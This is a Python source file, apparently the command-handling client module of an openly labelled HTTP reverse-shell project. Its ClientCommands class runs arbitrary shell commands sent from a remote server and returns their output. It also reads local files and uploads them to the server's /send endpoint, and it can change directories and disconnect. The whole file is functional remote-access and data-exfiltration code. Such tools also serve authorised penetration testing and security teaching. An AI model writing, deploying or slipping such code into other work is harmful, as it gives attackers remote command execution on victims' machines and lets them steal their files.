#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import http.client
import os
import subprocess
from pathlib import Path
from typing import Sequence


class ClientCommands:
    def __init__(self, client):
        self.client = client

    def cd(self, dest_dir: [str, None]) -> None:
        try:
            dest_dir = "~" if dest_dir is None else dest_dir
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self.client.send(f"{e}\n")

    def upload(self, filename: str) -> None:
        file_path = self.get_cwd().joinpath(filename)
        if not Path(file_path).is_file():
            self.client.send(f"{file_path}: No such file\n")
        else:
            with open(file=file_path, mode='rb') as fd:
                self.client.send(data=fd.read(),
                                 url=f"{self.client.server_url}/send")

    def disconnect(self, *args, **kwargs):
        connection = http.client.HTTPConnection(host=self.client.server_address,
                                                port=self.client.server_port)
        connection.request(method="GET",
                           url=self.client.server_url,
                           headers={"Connection": "close"})
        raise SystemExit

    def shell(self, command: [str, Sequence[str]]) -> None:
        cmd = subprocess.run(command, capture_output=True, shell=True)
        for result in cmd.stdout, cmd.stderr:
            if len(result) > 0:
                self.client.send(result)

    @staticmethod
    def get_cwd() -> Path:
        return Path.cwd()
